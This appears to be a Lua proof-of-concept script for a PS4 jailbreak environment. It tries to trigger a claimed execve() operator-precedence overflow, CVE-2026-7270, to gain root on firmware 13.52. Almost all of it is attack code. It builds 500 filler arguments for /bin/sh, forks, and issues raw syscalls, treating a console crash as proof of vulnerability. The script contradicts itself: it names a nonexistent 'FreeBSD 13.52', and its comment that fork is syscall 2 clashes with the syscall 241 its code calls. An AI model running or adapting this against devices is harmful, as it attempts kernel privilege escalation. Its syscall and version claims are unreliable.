------------------------------------------------------------
PS4 FW 13.52 - CVE-2026-7270 EXECVE OVERFLOW TEST
FreeBSD-SA-26:13.exec - operator precedence buffer overflow

Vulnerability: Operator precedence bug causes buffer overflow
in execve(2) where attacker-controlled data overwrites adjacent
argument buffers. Unprivileged user → root.

Affects: FreeBSD 13.5-RELEASE (confirmed NVD)
PS4 FW 13.52 = FreeBSD 13.52 → LIKELY VULNERABLE

Strategy: Test execve with many arguments to trigger overflow
------------------------------------------------------------

function read_qw(addr)
  local b0 = memory.read_byte(addr)
  local b1 = memory.read_byte(addr + 1)
  local b2 = memory.read_byte(addr + 2)
  local b3 = memory.read_byte(addr + 3)
  local b4 = memory.read_byte(addr + 4)
  local b5 = memory.read_byte(addr + 5)
  local b6 = memory.read_byte(addr + 6)
  local b7 = memory.read_byte(addr + 7)
  return b0 + b1*256 + b2*65536 + b3*16777216 + b4*4294967296 + b5*1099511627776 + b6*281474976710656 + b7*72057594037927936
end

local function s(n, a1, a2, a3, a4, a5, a6)
  local stub = syscall_stub[n]
  if not stub then stub = syscall_stub[675] end
  return native.fcall_with_rax(stub + 10, n, a1 or 0, a2 or 0, a3 or 0, a4 or 0, a5 or 0, a6 or 0)
end

print("============================================")
print("PS4 FW 13.52 - CVE-2026-7270 EXECVE TEST")
print("============================================")

-- CVE-2026-7270: execve() operator precedence bug
-- Buffer overflow when many arguments are passed
-- Fixed in FreeBSD 14.4-RELEASE-p3, 14.3-RELEASE-p12, 13.5-RELEASE-p13
-- PS4 FW 13.52 may NOT have this patch (built Jun 11 2026)

print("NOTE: This test creates many small arguments to execve()")
print("to trigger the operator precedence overflow in arg copying.")
print("We use fork() first so we don't replace our process.")

-- Create path string "/bin/sh"
local path = "/bin/sh"
local path_buf = memory.alloc(64)
for i = 1, #path do
  memory.write_byte(path_buf + i - 1, string.byte(path, i))
end
memory.write_byte(path_buf + #path, 0)

-- Build argument array: argv[0]="/bin/sh", argv[1..N]="AAAA"
local max_args = 500
local arg_array = memory.alloc((max_args + 2) * 8)

-- argv[0] = "/bin/sh"
memory.write_qword(arg_array, path_buf)

-- Create many short argument strings
local arg_strings = {}
for i = 1, max_args do
  local arg_buf = memory.alloc(32)
  for j = 0, 7 do memory.write_byte(arg_buf + j, 0x41) end
  memory.write_byte(arg_buf + 8, 0)
  memory.write_qword(arg_array + (i) * 8, arg_buf)
  arg_strings[i] = arg_buf
end
memory.write_qword(arg_array + (max_args + 1) * 8, 0)  -- NULL terminator

-- Create empty envp
local envp = memory.alloc(8)
memory.write_qword(envp, 0)

-- Fork first (syscall 2)
print(string.format("Forking with %d arguments...", max_args))
local child_pid = s(241)  -- fork via syscall 241
print(string.format("  fork() = %d", child_pid))

if child_pid == 0 then
  -- Child: call execve with many args
  print("  Child: calling execve()...")
  local r = s(59, path_buf, arg_array, envp)
  -- If execve succeeds, this process is replaced
  -- If it fails, we'll see the error
  print(string.format("  Child: execve() returned %d (error=%d)", r, -r))
else
  print(string.format("  Parent: child pid=%d", child_pid))
  -- Wait for child
  local status = memory.alloc(4)
  s(114, child_pid, status, 0)
  print("  Parent: child exited")
end

print("============================================")
print("If PS4 crashed, CVE-2026-7270 is VULNERABLE!")
print("If child died with error, likely patched.")
print("============================================")
